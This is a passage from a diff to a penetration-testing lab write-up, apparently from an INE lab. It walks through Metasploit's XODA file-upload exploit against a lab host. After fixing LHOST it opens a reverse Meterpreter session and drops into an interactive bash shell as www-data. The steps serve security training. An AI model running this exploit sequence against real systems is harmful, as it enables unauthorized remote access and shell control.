@@ -174,3 +174,55 @@ Exploit target:
 View the full module info with the info, or info -d command.
 
 ```
+run the exploit command, but got an error cause the LHOST parameter was not set.
+
+```
+
+msf6 exploit(unix/webapp/xoda_file_upload) > exploit
+
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:4444 
+[*] Sending PHP payload (TGQHtyJaURILI.php)
+[*] Executing PHP payload (TGQHtyJaURILI.php)
+[*] Exploit completed, but no session was created.
+
+```
+Change the parameter and run the exploit:
+
+```
+msf6 exploit(unix/webapp/xoda_file_upload) > set LHOST 192.70.151.2 
+LHOST => 192.70.151.2
+msf6 exploit(unix/webapp/xoda_file_upload) > exploit
+
+[*] Started reverse TCP handler on 192.70.151.2:4444 
+[*] Sending PHP payload (FjuRXO.php)
+[*] Executing PHP payload (FjuRXO.php)
+[*] Sending stage (39927 bytes) to 192.70.151.3
+[!] Deleting FjuRXO.php
+[*] Meterpreter session 1 opened (192.70.151.2:4444 -> 192.70.151.3:52870) at 2025-08-25 05:08:32 +0530
+
+```
+
+Now we have a Mertepreter session. Since you have this session, you can get the information of the target machine with the sysinfo command: 
+
+```
+meterpreter > sysinfo
+Computer    : demo1.ine.local
+OS          : Linux demo1.ine.local 6.8.0-63-generic #66-Ubuntu SMP PREEMPT_DYNAMIC Fri Jun 13 20:25:30 UTC 2025 x86_64
+Meterpreter : php/linux
+meterpreter > 
+
+```
+We have to look for the information of the second target, becuase we got the information of the known one
+For that, open a shell session and for better understanding you can change it to bash 
+
+```
+meterpreter > shell 
+Process 801 created.
+Channel 0 created.
+/bin/bash -i
+bash: cannot set terminal process group (433): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@demo1:/app/files$ 
+
+```
